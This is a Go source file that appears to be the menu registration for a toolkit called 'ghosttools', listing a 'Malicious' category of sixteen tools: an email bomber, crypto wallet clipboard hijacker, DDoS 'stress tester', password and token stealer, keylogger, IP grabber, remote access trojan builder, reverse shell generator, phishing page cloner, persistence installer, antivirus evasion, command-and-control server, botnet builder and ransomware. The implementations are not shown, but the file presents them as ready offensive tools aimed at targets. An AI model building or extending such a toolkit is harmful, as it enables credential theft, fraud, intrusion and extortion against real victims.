package cmd

import (
    "ghosttools/internal/malicious"
    "ghosttools/internal/ui"
)

func init() {
    ui.RegisterCategory(ui.Category{
        Name: "Malicious",
        Items: []ui.Item{
            {"Email Bomber", "send spam emails to target", malicious.EmailBomber},
            {"Wallet Clipper", "clipboard hijacking for wallets", malicious.CryptoClipper},
            {"Vuln Scanner", "scan targets for common vulns", malicious.VulnScanner},
            {"Stress Tester", "high traffic network stress test", malicious.DDoS},
           {"Password Grab", "compile password and token stealer", malicious.Stealer},
{"Keystroke Logger", "build stealth keystroke logger", malicious.Keylogger},
            {"IP Tracker", "generate tracking links for IPs", malicious.IPGrabber},
            {"Remote Builder", "build remote access trojan stubs", malicious.RATBuilder},
            {"Wallet Cracker", "bruteforce mnemonic phrases", malicious.WalletBrute},
            {"Reverse Shell", "generate reverse shell payloads", malicious.ReverseShell},
            {"Phish Page", "clone login pages for creds", malicious.PhishingPage},
            {"Persistence", "install persistence on target", malicious.Persistence},
            {"AV Bypass", "obfuscate payloads to bypass AV", malicious.AVEvasion},
            {"C2 Relay", "spin up a command and control", malicious.C2Server},
            {"Botnet Builder", "build a small botnet controller", malicious.Botnet},
            {"Ransomware Sim", "simulate ransomware encryption", malicious.RansomSim},
        },
    })
}